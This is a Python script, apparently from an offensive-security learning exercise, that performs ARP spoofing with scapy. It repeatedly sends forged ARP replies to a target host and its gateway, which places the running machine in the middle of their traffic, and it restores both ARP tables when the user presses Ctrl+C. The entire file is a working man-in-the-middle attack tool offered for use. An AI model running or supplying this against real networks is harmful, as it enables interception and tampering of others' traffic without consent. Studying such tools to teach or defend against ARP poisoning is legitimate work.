#!usr/bin/env python

import scapy.all as scapy
import time
import optparse

def get_ip():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target_ip", dest="target_ip", help="Target ip for ARP spoof")
    parser.add_option("-g", "--gateway_ip", dest="gateway_ip", help="Gateway ip for ARP spoof")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify an target ip, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway ip, use --help for more info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answerad_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answerad_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

ips = get_ip()
target_ip = ips.target_ip
gateway_ip = ips.gateway_ip

try:
    send_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packet_count = send_packet_count + 2
        print("\r[+] Send packets: " + str(send_packet_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ....... Quitting. ARP tables ....... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
